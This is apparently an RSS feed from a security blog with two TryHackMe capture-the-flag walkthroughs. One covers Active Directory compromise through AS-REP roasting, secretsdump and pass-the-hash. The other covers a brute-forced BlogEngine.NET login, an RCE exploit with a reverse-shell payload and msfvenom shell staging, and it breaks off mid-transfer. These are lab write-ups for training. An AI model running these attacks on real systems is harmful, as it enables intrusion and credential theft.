<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Imtodess</title>
        <link>https://imtodess.github.io/posts/</link>
        <description>Recent content in Posts on Imtodess</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Fri, 23 Jul 2021 11:32:28 +0545</lastBuildDate>
        <atom:link href="https://imtodess.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>THM | Attacktive Directory | Walkthrough</title>
            <link>https://imtodess.github.io/posts/2021/07/thm-attacktive-directory-walkthrough/</link>
            <pubDate>Fri, 23 Jul 2021 11:32:28 +0545</pubDate>
            
            <guid>https://imtodess.github.io/posts/2021/07/thm-attacktive-directory-walkthrough/</guid>
            <description>Walkthrough For THM - Attacktive Directory Summary Attacktive Directory - ‚Äú99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?‚Äù
In this walkthrough we will learn different ways to compromise the active directory using publicly available tools. You will learn a lot about Kerberos and how to crack their hashes, and how to use Impacket Secretsdump to dump Domain-control hashes, and how to access the machine with only NTLM hash with Evil-WinRM.</description>
            <content type="html"><![CDATA[<h2 id="walkthrough-for-thm---attacktive-directory">Walkthrough For THM - Attacktive Directory</h2>
<h3 id="summary">Summary</h3>
<p>Attacktive Directory - ‚Äú99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?‚Äù</p>
<p>In this walkthrough we will learn different ways to compromise the active directory using publicly available tools. You will learn a lot about Kerberos and how to crack their hashes, and how to use Impacket Secretsdump to dump Domain-control hashes, and how to access the machine with only NTLM hash with Evil-WinRM. So I highly recommend to go through this room yourself and get a hands on training.</p>
<p>URL: <a href="https://tryhackme.com/room/attacktivedirectory">Attacktive Directory - THM </a></p>
<p>Difficulty: Medium</p>
<p>Author: <a href="https://tryhackme.com/p/Sq00ky">Sq00ky</a></p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="welcome-to-attacktive-directory">Welcome to Attacktive Directory</h3>
<p>First do a Nmap scan to find our which services are running on the target machine.</p>
<pre><code>root@kali:~# nmap -p- -A -nP 10.10.100.54¬†
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 10:37 UTC
Nmap scan report for 10.10.100.54¬†
Host is up (0.00043s latency).
Not shown: 65508 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-17 10:43:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2020-04-17T10:45:49+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2020-04-03T18:40:09
|_Not valid after:  2020-10-03T18:40:09
|_ssl-date: 2020-04-17T10:46:02+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49789/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=4/17%Time=5E99884F%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03&quot;);
MAC Address: 02:41:2E:CE:EA:1A (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=4/17%OT=53%CT=1%CU=44531%PV=Y%DS=1%DC=D%G=Y%M=02412E%T
OS:M=5E998918%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=104%TI=I%CI=I%II=I
OS:%SS=S%TS=U)OPS(O1=M2301NW8NNS%O2=M2301NW8NNS%O3=M2301NW8%O4=M2301NW8NNS%
OS:O5=M2301NW8NNS%O6=M2301NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W
OS:6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y
OS:%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%
OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=8
OS:0%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%
OS:Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
OS:Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: ATTACKTIVEDIREC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:41:2e:ce:ea:1a (unknown)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-04-17T10:45:49
|_  start_date: N/A


OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 550.50 seconds
</code></pre><p>From the Nmap scan we also get the DNS domain name. So lets add that to our <code>/etc/hosts</code> file.</p>
<pre><code>echo 10.10.100.54¬† spookysec.local &gt;&gt; /etc/hosts
</code></pre><h4 id="answers-to-the-questions">Answers to the questions</h4>
<ul>
<li>
<p>What tool will allow us to enumerate port 139/445?</p>
<p><code>SMB</code> runs on port 139/445. So to enumerate it <code>enum4linux</code> is very useful.</p>
</li>
<li>
<p>What is the NetBIOS-Domain Name of the machine?</p>
<p>See the Nmap result.</p>
<pre><code>3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2020-04-17T10:45:49+00:00
</code></pre></li>
<li>
<p>What invalid TLD do people commonly use for their Active Directory Domain?</p>
<p><code>.local</code> is the commonly used invalid TLD for AD domain.</p>
</li>
</ul>
<h3 id="enumerating-users-via-kerberos">Enumerating Users via kerberos</h3>
<p>From the nmap result we know that Kerberos is running on the host machine. Kerberos is a key authentication service within Active Directory. We can enumerate this service using <a href="https://github.com/ropnop/kerbrute/releases">Kerbrute</a>.</p>
<p>| Note: Use the wordlist from the room itself.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/attacktiveDirectory]
‚îî‚îÄ$ kerbrute userenum --dc spookysec.local -d spookysec.local ./user.txt                                                  
    __             __               __      
   / /_____  _____/ /_  _______  __/ /____  
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                         

Version: v1.0.3 (9dad6e1) - 07/20/21 - Ronnie Flathers @ropnop

2021/07/20 06:35:15 &gt;  Using KDC(s):
2021/07/20 06:35:15 &gt;   spookysec.local:88

2021/07/20 06:35:16 &gt;  [+] VALID USERNAME:       james@spookysec.local
2021/07/20 06:35:19 &gt;  [+] VALID USERNAME:       svc-admin@spookysec.local
2021/07/20 06:35:23 &gt;  [+] VALID USERNAME:       James@spookysec.local
2021/07/20 06:35:24 &gt;  [+] VALID USERNAME:       robin@spookysec.local
2021/07/20 06:35:42 &gt;  [+] VALID USERNAME:       darkstar@spookysec.local
2021/07/20 06:35:53 &gt;  [+] VALID USERNAME:       administrator@spookysec.local
2021/07/20 06:36:13 &gt;  [+] VALID USERNAME:       backup@spookysec.local
2021/07/20 06:36:23 &gt;  [+] VALID USERNAME:       paradox@spookysec.local
2021/07/20 06:37:27 &gt;  [+] VALID USERNAME:       JAMES@spookysec.local
2021/07/20 06:37:48 &gt;  [+] VALID USERNAME:       Robin@spookysec.local
2021/07/20 06:39:56 &gt;  [+] VALID USERNAME:       Administrator@spookysec.local
2021/07/20 06:44:27 &gt;  [+] VALID USERNAME:       Darkstar@spookysec.local
2021/07/20 06:45:54 &gt;  [+] VALID USERNAME:       Paradox@spookysec.local
2021/07/20 06:50:51 &gt;  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2021/07/20 06:52:20 &gt;  [+] VALID USERNAME:       ori@spookysec.local
2021/07/20 06:54:58 &gt;  [+] VALID USERNAME:       ROBIN@spookysec.local
2021/07/20 07:01:01 &gt;  Done! Tested 73317 usernames (16 valid) in 1546.379 seconds
</code></pre><h4 id="answers-to-the-questions-1">Answers to the questions</h4>
<ul>
<li>
<p>What command within Kerbrute will allow us to enumerate valid usernames?</p>
<p><code>userenum</code> flag allows us to enumerate the valid usernames.</p>
</li>
<li>
<p>What notable account is discovered? (These should jump out at you)</p>
<p><code>svc-admin (service admin)</code> &amp; <code>administrator</code> are the notable accounts. Most of the time <code>administrator</code> account on a network is disabled, but they haven‚Äôt here.</p>
</li>
<li>
<p>What is the other notable account is discovered? (These should jump out at you)</p>
<p>Apart from <code>svc-admin</code> &amp; <code>administrator</code> you may also want to look at <code>backup</code>.</p>
</li>
</ul>
<h2 id="exploitation">Exploitation</h2>
<h3 id="abusing-kerberos">Abusing Kerberos</h3>
<p>After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called <code>ASREPRoasting</code>. <code>ASReproasting</code> occurs when a user account has the privilege <code>Does not require Pre-Authentication</code> set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.</p>
<p>To know more about this topic refer to this <a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">Roasting AS-REPs</a> article.</p>
<p>We will use one of the tool from <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> called <code>GetNPUsers.py</code>. To know more about <code>Kerberos pre-auth</code> and <code>GetNPUsers</code> refer to this <a href="https://www.youtube.com/watch?v=pZSyGRjHNO4&amp;t=6s">Kerberos Pre-Auth Explained</a>.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[/usr/share/doc/python3-impacket/examples]
‚îî‚îÄ$ sudo python3 GetNPUsers.py spookysec.local/svc-admin -no-pass   

Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:31b7401610d1d31ca7515a59e756cb73$d6a2f9ee7ccd0e820332979ca06a3d24327ce88385051fae9b21b1ef064a579[REDACTED]d962cc86dc0839eb5eb44eb144
</code></pre><p>Save the hash to a file. And crack it using <code>hashcat</code>.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/attacktiveDirectory]
‚îî‚îÄ$ hashcat -m 18200 -a 0 hash.txt ./pass.txt   
. . .
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:31b7401610d1d31ca7515a59e756cb73$d6a2f9ee7ccd0e820332979ca06a3d24327ce88385051fae9b21b1ef064a579c77d61ad4e3df41[REDACTED]b44eb144:[REDACTED]

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:31b7401610d...4eb144
</code></pre><p>Now we have both <code>username</code> and <code>password</code>. We can use this credential to enumerate Further.</p>
<h4 id="answers-to-the-questions-2">Answers to the questions</h4>
<ul>
<li>
<p>We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?</p>
<p>We can query a ticket from <code>svc-admin</code> user. <code>Administrator</code> account doesn&rsquo;t have <code>Pre-Auth</code> set for this to work.</p>
</li>
<li>
<p>Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)</p>
<p>Kerberos 5 AS-REP etype 23</p>
</li>
<li>
<p>What mode is the hash?</p>
<p>18200</p>
</li>
<li>
<p>Now crack the hash with the modified password list provided, what is the user accounts password?</p>
<p>Use above information above to get this answer.</p>
</li>
</ul>
<h3 id="back-to-basics">Back to Basics</h3>
<p>With a user&rsquo;s account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.</p>
<p>We will use smbclient to list the shares using the credential we got earlier.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/attacktiveDirectory]
‚îî‚îÄ$ smbclient -L $ip -U svc-admin                                       
Enter WORKGROUP\svc-admin's password:
        Sharename       Type      Comment         
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk       
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share  
        SYSVOL          Disk      Logon server share  

SMB1 disabled -- no workgroup available
</code></pre><p><code>backup</code> share seems interesting.  Let&rsquo;s see the content of this share.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/attacktiveDirectory]
‚îî‚îÄ$ smbclient //10.10.100.54/backup -U svc-admin                            
Enter WORKGROUP\svc-admin's password:  
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020
                8247551 blocks of size 4096. 3662067 blocks available
smb: \&gt; get backup_credentials.txt  
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \&gt; exit
</code></pre><p>There was the text file with possible credentials to the user <code>backup</code>. Download the file to local machine and check the contents.</p>
<p>The file had base54 encoded text. Decode it to reveal the credential.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/attacktiveDirectory]
‚îî‚îÄ$ echo &quot;YmFja3VwQHNwb29reXNlYy5sb[REDACTED]&quot; | base64 -d     
backup@spookysec.local:[REDACTED]
</code></pre><h4 id="answers-to-the-questions-3">Answers to the questions</h4>
<ul>
<li>
<p>What utility can we use to map remote SMB shares?</p>
<p><code>smbclient</code> &amp; <code>smbmap</code> can be used to list the SMB shares.</p>
</li>
<li>
<p>Which option will list shares?</p>
<p>In <code>smbclient</code> <code>-L</code> will list the shares.</p>
</li>
<li>
<p>How many remote shares is the server listing?</p>
<p>six</p>
</li>
<li>
<p>There is one particular share that we have access to that contains a text file. Which share is it?</p>
<p>We have <code>read/write</code> access to <code>backup</code> share.</p>
</li>
<li>
<p>What is the content of the file?</p>
<p>YmFja3VwQHNwb29reXNlYy5sb2[Redacted]</p>
</li>
<li>
<p>Decoding the contents of the file, what is the full contents?</p>
<p><a href="mailto:backup@spookysec.local">backup@spookysec.local</a>:[REDACTED]</p>
</li>
</ul>
<h2 id="domain-privilege-escalation">Domain Privilege Escalation</h2>
<h3 id="elevating-privileges-within-the-domain">Elevating Privileges within the domain</h3>
<p>&ldquo;Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account &ldquo;backup&rdquo; gets us thinking. What is this the backup account to?</p>
<p>Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes&rdquo;</p>
<p>We will now attempt to enumerate additional user information using another tool from <em><strong>IMPACKET</strong></em> called <code>secretsdump.py</code>.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[/usr/share/doc/python3-impacket/examples]    
‚îî‚îÄ$ sudo impacket-secretsdump -just-dc backup:[REDACTED]@10.10.100.54  
Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corporation
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:[REDACTED]:::
Guest:501:[REDACTED]:::
krbtgt:502:[REDACTED]:::
. . .
spookysec.local\darkstar:1108:[REDACTED]:[REDACTED]:::
spookysec.local\Ori:1109:[REDACTED]:[REDACTED]:::               
spookysec.local\robin:1110:[REDACTED]:[REDACTED]:::    
spookysec.local\paradox:1111:[REDACTED]:[REDACTED]:::   
spookysec.local\Muirland:1112:[REDACTED]:[REDACTED]:::   
spookysec.local\horshark:1113:[REDACTED]:[REDACTED]:::   
spookysec.local\svc-admin:1114:[REDACTED]:[REDACTED]:::         
spookysec.local\backup:1118:[REDACTED]:[REDACTED]:::  
spookysec.local\a-spooks:1601:[REDACTED]:[REDACTED]:::  
ATTACKTIVEDIREC$:1000:[REDACTED]:[REDACTED]:::                            
[*] Kerberos keys grabbed                              
Administrator:aes256-cts-hmac-sha1-96:[REDACTED]
Administrator:aes128-cts-hmac-sha1-96:[REDACTED]
. . .
</code></pre><p>We get the hashes of different accounts including the administrator. We can either decrypt the hash and connect as Administrator or use <code>Evil-winrm</code> to get a shell.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[/usr/share/doc/python3-impacket/examples]
‚îî‚îÄ$ evil-winrm -i 10.10.100.54 -u Administrator -H [HASH_REDACTED]    

*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir
    Directory: C:\Users\Administrator\Desktop   
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  11:39 AM             32 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
TryHackMe{REDACTED}
</code></pre><h4 id="answers-to-the-questions-4">Answers to the questions</h4>
<ul>
<li>
<p>What method allowed us to dump NTDS.DIT?</p>
<p><code>DRSUAPI</code> method</p>
</li>
<li>
<p>What is the Administrators NTLM hash?</p>
<p>See the result of <code>secretsdump.py</code></p>
</li>
<li>
<p>What method of attack could allow us to authenticate as the user without the password?</p>
<p>Pass The Hash</p>
</li>
<li>
<p>Using a tool called Evil-WinRM what option will allow us to use a hash?</p>
<p><code>-H</code></p>
</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>THM | Hackpark | Walkthrough (No Metasploit)</title>
            <link>https://imtodess.github.io/posts/2021/07/thm-hackpark-walkthrough-no-metasploit/</link>
            <pubDate>Wed, 14 Jul 2021 10:56:57 +0545</pubDate>
            
            <guid>https://imtodess.github.io/posts/2021/07/thm-hackpark-walkthrough-no-metasploit/</guid>
            <description>Exploitation Guide For Hackpark Summary In this walkthrough we will brute-force the login, and exploit the blogging platform with publicly available exploit. Then we will escalate our privileges by exploiting one of the services running on the target machine which has insecure file permissions.
Enumeration Service Enumeration using Nmap ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/hackpark/scans] ‚îî‚îÄ$ nmap $ip -p- -Pn -vv PORT STATE SERVICE REASON 80/tcp open http syn-ack 3389/tcp open ms-wbt-server syn-ack ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/hackpark/scans] ‚îî‚îÄ$ nmap -Pn -p80,3389 -sVCT -oN nmapInitial.</description>
            <content type="html"><![CDATA[<h2 id="exploitation-guide-for-hackpark">Exploitation Guide For Hackpark</h2>
<h3 id="summary">Summary</h3>
<p>In this walkthrough we will brute-force the login, and exploit the blogging platform with publicly available exploit. Then we will escalate our privileges by exploiting one of the services running on the target machine which has insecure file permissions.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="service-enumeration-using-nmap">Service Enumeration using Nmap</h3>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/hackpark/scans]
‚îî‚îÄ$ nmap $ip -p- -Pn -vv                       
PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack
3389/tcp open  ms-wbt-server syn-ack

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/hackpark/scans]
‚îî‚îÄ$ nmap -Pn -p80,3389 -sVCT -oN nmapInitial.txt $ip
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods:  
|_  Potentially risky methods: TRACE
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2021-07-10T10:15:14
|_Not valid after:  2022-01-09T10:15:14
|_ssl-date: 2021-07-11T10:19:32+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre><p>From our quick scan, we only found 2 ports with <code>HTTP</code> and <code>RDP</code> running.</p>
<h3 id="web-enumeration">Web Enumeration</h3>
<p>Its a Blogging site powered by <code>Blogengine.net</code>. There is one post by user <code>administrator</code>
<img src="/img/hackpark/hackpark.png" alt="Landing Page"></p>
<p>Found the login page.
<img src="/img/hackpark/hackpark1.png" alt="Login page"></p>
<h2 id="exploitation">Exploitation</h2>
<h3 id="initial-exploitation">Initial Exploitation</h3>
<p>We will be bruteforcing the login page with <code>hydra</code> to get credential. First capture the login request to see what parameters are being used in a request.
<img src="/img/hackpark/hackpark3.png" alt="Burp request"></p>
<p>Now use the above information and bruteforce the login.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/hackpark/scans]
‚îî‚îÄ$ hydra $ip -l admin -P /usr/share/wordlists/rockyou.txt http-post-form '/Account/login.aspx?ReturnURL=%2fadmin:__VIEWSTATE=%2FD9Ha%2BVMOf3JKccKxav2XJyprcsMRgtCvSJWZ8z8B4SozgyWD9zeVICyWyfvO9LSY8iGaetZcLKLOgmb1n5qHu7R8sD0cn9TwwfCJt4Pdckf6hcvHxwAMPlZc1Oj3Z%2F1gHJPLAK3xQw7sWH7TBiVlDlZVlCttpxQGqR%2FDEyCrKK9da9tRC7Hay5U6WIo%2B2yy1ptE0oBbQ%2BG4Psg9eeSP9LU9uY3rPoAPvpsmMPcwCI9UKCUd8LlOqYsNeXVzeBfp5jcHAF25qtWeMGfEcdFGoOQe7z%2BaG1pobfKpWJWIZG2Rd6Sxv1FXw%2FxUFz63iwzrlAo35d9doxdHkznG0moMTqXR7fGhk5lwA3JKUNFBUG%2FRch7c&amp;__EVENTVALIDATION=oxGnPpaUP1%2FXLhZdmg%2FLGbQancEsVExJ0kHtaCV3au3m08%2B0KFo9h2aLEhhi6ELUwP1ym1uj7mAlZi5qfC48drbb7WnNs35oIHBRho4B1vu0YfJlufLIWzv2j7BFBcc2%2BLSVNNI2BtSvpOUR%2Fr4kp9n7Y%2FbbrMRK73ckq1i8VfBz6373&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24RememberMe=on&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed'                                                 
. . .

[STATUS] 948.00 tries/min, 948 tries in 00:01h, 14343451 to do in 252:11h, 16 active
[80][http-post-form] host: 10.10.158.32   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-11 07:21:57
</code></pre><p>We found the valid credential. Login using the new found password.
<img src="/img/hackpark/hackpark2.png" alt="Logged in"></p>
<p>We now know the version of the CMS. Lets search for any known exploits.</p>
<pre><code>Search for exploits

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/hackpark/exploit]
‚îî‚îÄ$ searchsploit blogengine 3.3.6

--------------------------------------------------------------------- ---------------------------------

 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution   | aspx/webapps/46353.cs
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote  | aspx/webapps/47010.py
BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal              | aspx/webapps/47035.py
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Re | aspx/webapps/47011.py
BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection           | aspx/webapps/47014.py
--------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre><p>There are various exploits but the one we are interested is <code>Directory Traversal / Remote Code Execution</code>.</p>
<p>Lets copy the exploit to our working directory.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/hackpark/exploit]
‚îî‚îÄ$ searchsploit ‚Äìm aspx/webapps/46353.cs                                                 
  Exploit: BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution         
      URL: https://www.exploit-db.com/exploits/46353
     Path: /usr/share/exploitdb/exploits/aspx/webapps/46353.cs     
File Type: HTML document, ASCII text, with CRLF line terminators
Copied to: /home/kali/ctf/thm/hackpark/exploit/46353.cs
</code></pre><p>According to the exploit, we can upload malicious file using the edit post feature (Admin page that allows upload <code>/admin/app/editor/editpost.cshtml</code>). The name of the file must be <code>PostView.ascx</code>. Once uploaded we can trigger the payload by going to <code>/?theme=../../App_Data/files</code>.</p>
<p>Edit the payload and put your <code>&lt;local_ip&gt;</code> &amp; <code>&lt;Local_port&gt;</code> to receive the shell.</p>
<pre><code>// small portion of the payload. Replace the value of LHOST and LPORT with yours
. . .
using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(&quot;$LHOST&quot;, $LPORT)) {
using(System.IO.Stream stream = client.GetStream()) {
using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {
streamWriter = new System.IO.StreamWriter(stream);
. . .
</code></pre><p>Now upload the exploit.
<img src="/img/hackpark/hackpark4.png" alt="Uploading the exploit"></p>
<p>Start a <code>netcat</code> Listener and trigger the exploit.</p>
<p><img src="/img/hackpark/hackpark5.png" alt="Trigger the exploit"></p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/hackpark/scans]  
‚îî‚îÄ$ nc -nvlp 4444                              
listening on [any] 4444 ...
connect to [10.11.25.224] from (UNKNOWN) [10.10.158.32] 49286
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.                     
whoami                                    
c:\windows\system32\inetsrv&gt;whoami
iis apppool\blog   
</code></pre><h3 id="privilege-escalation">Privilege escalation</h3>
<p>First of all, Let&rsquo;s change our shell since the one we got is unstable.</p>
<p>Generate the exploit using <code>msfvenom</code>.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/hackpark/exploit]
‚îî‚îÄ$ msfvenom -p windows/x64/shell_reverse_tcp -f exe -o rce.exe LHOST=10.11.25.224 LPORT=8081    

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload

No encoder specified, outputting raw payload

Payload size: 460 bytes
Final size of exe file: 7168 bytes            
Saved as: rce.exe   
</code></pre><p>Start a smb server to transfer the shell to target machine.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/hackpark/exploit]
‚îî‚îÄ$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
</code></pre><p>Download the exploit in the target machine.</p>
<pre><code>C:\Users\Public&gt;dir \\10.11.25.224\share
 Volume in drive \\10.11.25.224\share has no label.
 Volume Serial Number is ABCD-EFAA
 Directory of \\10.11.25.224\share
